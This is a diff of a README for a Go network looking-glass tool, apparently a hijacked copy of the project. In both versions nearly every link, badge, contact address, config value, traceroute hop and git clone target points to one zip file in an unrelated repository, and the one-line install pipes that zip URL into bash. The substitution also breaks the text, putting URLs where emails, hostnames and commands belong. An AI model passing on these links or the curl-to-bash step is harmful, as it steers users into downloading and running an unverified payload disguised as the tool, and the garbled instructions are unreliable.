@@ -4,14 +4,14 @@
 
 A high-performance network diagnostic tool for ISPs, hosting providers, and network operators. Supports multiple router vendors (Juniper, Huawei, Cisco) with a beautiful, responsive web interface and **real-time streaming** capabilities.
 
-[![Go Version](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip+https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-[![License](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](LICENSE)
-[![Docker Hub](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip%20Hub-paolokappa%2Fgoline--looking--glass-blue?logo=docker)](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-[![Docker](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](Dockerfile)
-[![Version](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](#)
+[![Go Version](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip+https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+[![License](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](LICENSE)
+[![Docker Hub](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip%20Hub-paolokappa%2Fgoline--looking--glass-blue?logo=docker)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+[![Docker](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](Dockerfile)
+[![Version](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](#)
 
 > **Author:**Paolo Caparrelli | **Company:**GOLINE SA 
-> **Contact:** [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) | **AS:**AS202032
+> **Contact:** [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) | **AS:**AS202032
 
 ## &#x1F680; Features
 
@@ -54,7 +54,7 @@ docker run -d \
 # Access at http://localhost:3002
 ```
 
-**&#x1F433; Docker Hub**: [paolokappa/goline-looking-glass](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+**&#x1F433; Docker Hub**: [paolokappa/goline-looking-glass](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 **Available tags:**
 - `latest` - Latest stable version with streaming features
@@ -76,7 +76,7 @@ services:
    - PORT=3002
   volumes:
    - ./logs:/app/logs
-   - https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+   - https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
   healthcheck:
    test: ["CMD", "curl", "-f", "http://localhost:3002/api/health"]
    interval: 30s
@@ -93,14 +93,14 @@ docker-compose up -d
 ### &#x1F680; One-Line Installation
 
 ```bash
-curl -sSL https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip | bash
+curl -sSL https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip | bash
 ```
 
 ### &#x1F527; Manual Installation
 
 ```bash
 # Clone repository
-git clone https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+git clone https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
 cd goline-looking-glass
 
 # Install dependencies and build
@@ -108,25 +108,25 @@ make setup
 make build
 
 # Configure your environment
-cp https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
-cp https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+cp https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
+cp https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
 
 # Edit configurations
-nano https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
-nano https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+nano https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
+nano https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
 
 # Install system service
 sudo make install
 
 # Setup SSL (optional)
-sudo https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+sudo https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
 ```
 
 ### &#x1F433; Docker Deployment from Source
 
 ```bash
 # Quick start with Docker Compose
-git clone https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+git clone https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
 cd goline-looking-glass
 docker-compose up -d
 ```
@@ -147,8 +147,8 @@ The streaming interface shows live output like this:
 ```
 traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 52 byte packets
  1 gateway (192.168.1.1) 1.234 ms 1.123 ms 1.456 ms
- 2 https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip (10.1.1.1) 15.678 ms 14.234 ms 16.123 ms
- 3 https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip (203.0.113.1) 25.123 ms 24.567 ms 26.789 ms
+ 2 https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip (10.1.1.1) 15.678 ms 14.234 ms 16.123 ms
+ 3 https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip (203.0.113.1) 25.123 ms 24.567 ms 26.789 ms
 [continues in real-time...]
 ```
 
@@ -171,38 +171,38 @@ traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 52 byte packets
 ## &#x1F4F8; Screenshots
 
 ### Desktop Interface
-![Desktop Interface](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+![Desktop Interface](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ### Mobile Interface 
-![Mobile Interface](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+![Mobile Interface](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ### Command Results
-![Command Results](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+![Command Results](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ## &#x1F4DA; Documentation
 
 ### Getting Started
-- [Installation Guide](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Complete installation instructions
-- [Configuration Guide](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - System and application configuration
-- [Router Setup](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Router-specific configuration
-- [Customization](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Theming and branding options
+- [Installation Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Complete installation instructions
+- [Configuration Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - System and application configuration
+- [Router Setup](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Router-specific configuration
+- [Customization](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Theming and branding options
 
 ### Deployment
-- [Docker Deployment](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Container-based deployment
-- [Kubernetes](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Kubernetes deployment manifests
-- [Cloud Deployment](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - AWS, GCP, Azure deployment guides
+- [Docker Deployment](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Container-based deployment
+- [Kubernetes](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Kubernetes deployment manifests
+- [Cloud Deployment](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - AWS, GCP, Azure deployment guides
 
 ### Operations
-- [Security Guide](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Security best practices and hardening
-- [Monitoring](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Monitoring and alerting setup
-- [Troubleshooting](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Common issues and solutions
-- [Performance](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Performance tuning and optimization
+- [Security Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Security best practices and hardening
+- [Monitoring](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Monitoring and alerting setup
+- [Troubleshooting](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Common issues and solutions
+- [Performance](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Performance tuning and optimization
 
 ### Development
-- [Development Setup](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Local development environment
-- [Contributing](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - How to contribute to the project
-- [API Reference](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - REST API documentation
-- [Testing](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Testing guidelines and procedures
+- [Development Setup](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Local development environment
+- [Contributing](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - How to contribute to the project
+- [API Reference](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - REST API documentation
+- [Testing](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Testing guidelines and procedures
 
 ## &#x2699;&#xFE0F; Configuration Examples
 
@@ -212,9 +212,9 @@ traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 52 byte packets
  "company": {
   "name": "Your ISP Name",
   "as_number": "AS64512",
-  "domain": "https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip",
-  "support_email": "https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip",
-  "logo_path": "https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip",
+  "domain": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
+  "support_email": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
+  "logo_path": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
   "theme": {
    "primary_color": "#1e3a8a",
    "secondary_color": "#667eea",
@@ -231,7 +231,7 @@ traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 52 byte packets
   {
    "name": "Primary Core Router",
    "display_name": "NYC-Core-01",
-   "hostname": "https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip",
+   "hostname": "https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip",
    "type": "juniper",
    "username": "${ROUTER_USER}",
    "ssh_key": "/opt/looking-glass/keys/router_key"
@@ -258,7 +258,7 @@ traceroute to 8.8.8.8 (8.8.8.8), 30 hops max, 52 byte packets
 
 ## &#x1F310; Live Demo
 
-- **&#x1F30D; GOLINE SA Production**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Live production instance with real-time streaming &#x2728;
+- **&#x1F30D; GOLINE SA Production**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Live production instance with real-time streaming &#x2728;
 - **&#x1F6A2; Docker Quick Test**: `docker run -p 3002:3002 paolokappa/goline-looking-glass:latest` &#x1F680;
 
 ## &#x1F4CA; Performance Benchmarks
@@ -298,18 +298,18 @@ curl -X POST http://localhost:3002/api/execute-stream \
 
 We welcome contributions from the community! Here's how you can help:
 
-1. **&#x1F41B; Report Bugs**: Use [GitHub Issues](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+1. **&#x1F41B; Report Bugs**: Use [GitHub Issues](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 2. **&#x1F4A1; Feature Requests**: Propose new features via issues
 3. **&#x1F4E4; Pull Requests**: Submit code improvements
 4. **&#x1F4DD; Documentation**: Help improve documentation
 5. **&#x1F9EA; Testing**: Test on different platforms and configurations
 
-See our [Contributing Guide](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) for detailed information.
+See our [Contributing Guide](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) for detailed information.
 
 ### Development Setup
 ```bash
 # Fork and clone the repository
-git clone https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip
+git clone https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip
 cd goline-looking-glass
 
 # Setup development environment
@@ -342,51 +342,51 @@ This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) 
 - &#x1F6E0;&#xFE0F; Network Infrastructure Solutions
 - &#x2601;&#xFE0F; Cloud Connectivity Services
 
-Learn more: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+Learn more: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ## &#x1F468;&#x200D;&#x1F4BB; Author
 
 **Paolo Caparrelli**
 - **Company**: GOLINE SA
-- **Email**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **Website**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **LinkedIn**: [Paolo Caparrelli](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **GitHub**: [@paolokappa](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+- **Email**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **Website**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **LinkedIn**: [Paolo Caparrelli](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **GitHub**: [@paolokappa](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ## Support ## &#x1F4AC; Support & Contact Contact
 
 ### &#x1F31F; Community Support
-- **Bug Reports**: [GitHub Issues](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **Discussions**: [GitHub Discussions](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **&#x1F4DD; Documentation**: [GitHub Wiki](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+- **Bug Reports**: [GitHub Issues](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **Discussions**: [GitHub Discussions](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **&#x1F4DD; Documentation**: [GitHub Wiki](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ### &#x1F4BC; Commercial Support
-- **&#x1F4E7; Technical Support**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **&#x1F4BC; Enterprise Inquiries**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+- **&#x1F4E7; Technical Support**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **&#x1F4BC; Enterprise Inquiries**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 - **&#x1F4DE; Phone**: +41 91 2607650 (Business hours: UTC+1)
 
 ### &#x1F517; Quick Links
-- **&#x1F310; Website**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **&#x1F4E1; Network Info**: [AS202032 Details](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **&#x1F50D; Live Demo**: [https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-- **&#x1F433; Docker Hub**: [paolokappa/goline-looking-glass](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+- **&#x1F310; Website**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **&#x1F4E1; Network Info**: [AS202032 Details](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **&#x1F50D; Live Demo**: [https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+- **&#x1F433; Docker Hub**: [paolokappa/goline-looking-glass](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ## &#x1F64F; Acknowledgments
 
 Special thanks to:
-- [Gin Web Framework](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - HTTP web framework
-- [SSH Library](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - SSH client implementation 
-- [Go Community](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Amazing programming language and ecosystem
-- [Network Community](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Inspiration and feedback
-- [Docker Community](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip) - Containerization platform
+- [Gin Web Framework](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - HTTP web framework
+- [SSH Library](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - SSH client implementation 
+- [Go Community](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Amazing programming language and ecosystem
+- [Network Community](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Inspiration and feedback
+- [Docker Community](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip) - Containerization platform
 - **Contributors** - Everyone who has contributed to this project
 
 ## &#x1F4C8; Project Stats
 
-[![GitHub stars](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-[![GitHub forks](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-[![GitHub issues](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
-[![GitHub pull requests](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)](https://github.com/rlmourarj/goline-lg/raw/refs/heads/main/.github/goline-lg-1.4.zip)
+[![GitHub stars](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+[![GitHub forks](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+[![GitHub issues](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
+[![GitHub pull requests](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)](https://raw.githubusercontent.com/rlmourarj/goline-lg/main/scripts/lg-goline-v1.6.zip)
 
 ---
 
